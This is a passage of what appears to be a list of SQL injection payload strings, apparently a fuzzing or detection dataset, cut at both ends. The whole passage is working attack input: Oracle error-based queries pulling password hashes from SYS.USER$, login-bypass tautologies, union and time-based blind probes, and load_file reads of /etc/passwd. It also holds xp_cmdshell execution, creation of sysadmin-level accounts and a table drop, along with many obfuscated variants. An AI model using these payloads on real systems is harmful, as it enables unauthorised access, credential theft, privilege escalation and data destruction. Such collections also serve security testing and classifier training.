       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  \",\n",
       " '||6',\n",
       " \"'||'6\",\n",
       " ' ( ||6 ) ',\n",
       " \"' or 1 = 1-- \",\n",
       " 'or 1 = 1',\n",
       " \"' or '1' = '1\",\n",
       " \"; or '1' = '1'\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' or '7659' = '7659\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' -- \",\n",
       " \"' or 1 = 1--\",\n",
       " '\" or 1 = 1--',\n",
       " \"' or 1 = 1 /*\",\n",
       " 'or 1 = 1--',\n",
       " \"' or 'a' = 'a\",\n",
       " '\" or \"a\" = \"a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " \"admin' or '\",\n",
       " \"' select * from information_schema.tables--\",\n",
       " ' )  union select * from information_schema.tables;',\n",
       " \"' having 1 = 1--\",\n",
       " \"' having 1 = 1--\",\n",
       " \"' group by userid having 1 = 1--\",\n",
       " \"' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --\",\n",
       " \"' or 1 in  ( select @@version ) --\",\n",
       " \"' union all select @@version--\",\n",
       " \"' or 'unusual'  =  'unusual'\",\n",
       " \"' or 'something'  =  'some'+'thing'\",\n",
       " \"' or 'text'  =  n'text'\",\n",
       " \"' or 'something' like 'some%'\",\n",
       " \"' or 2 > 1\",\n",
       " \"' or 'text' > 't'\",\n",
       " \"' or 'whatever' in  ( 'whatever' ) \",\n",
       " \"' or 2 between 1 and 3\",\n",
       " \"' or username like char ( 37 ) ;\",\n",
       " \"' union select * from users where login  =  char ( 114,111,111,116 ) ;\",\n",
       " \"' union select \",\n",
       " 'password:*/ = 1--',\n",
       " 'uni/**/on sel/**/ect',\n",
       " \"'; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " \"'; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
       " \"'/**/or/**/1/**/ = /**/1\",\n",
       " \"' or 1/*\",\n",
       " ' or isNULL ( 1/0 )  /*',\n",
       " \"' or '7659' = '7659\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' -- &password = \",\n",
       " \"'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > \",\n",
       " '@var select @var as var into temp end --',\n",
       " \"' and 1 in  ( select var from temp ) --\",\n",
       " \"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
       " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;',\n",
       " \"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;\",\n",
       " \"'; exec master..xp_cmdshell 'ping 10.10.1.2'--\",\n",
       " \"create user name identified by 'pass123'\",\n",
       " 'create user name identified by pass123 temporary tablespace temp default tablespace users; ',\n",
       " \"' ; drop table temp --\",\n",
       " \"exec sp_addlogin 'name' , 'password'\",\n",
       " \"exec sp_addsrvrolemember 'name' , 'sysadmin'\",\n",
       " \"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  \",\n",
       " 'grant connect to name; grant resource to name;',\n",
       " 'insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ',\n",
       " \"' or 1 = 1 --\",\n",
       " \"' union  ( select @@version )  --\",\n",
       " \"' union  ( select NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --\",\n",
       " \"'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- \",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --\",\n",
       " ' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1   or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or !<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or !<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.&&1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.&&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1. <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.<@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.%@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.%@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 11<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +\\\\+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 -1<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1||@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1`\\\\`,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1$_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @&&@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select  @ $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select @ _,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$ 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( $ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( @ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1<@.. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@.$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 <1## union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@1$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@1$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 %$ 1 or 1 = 1 -- 1',\n",
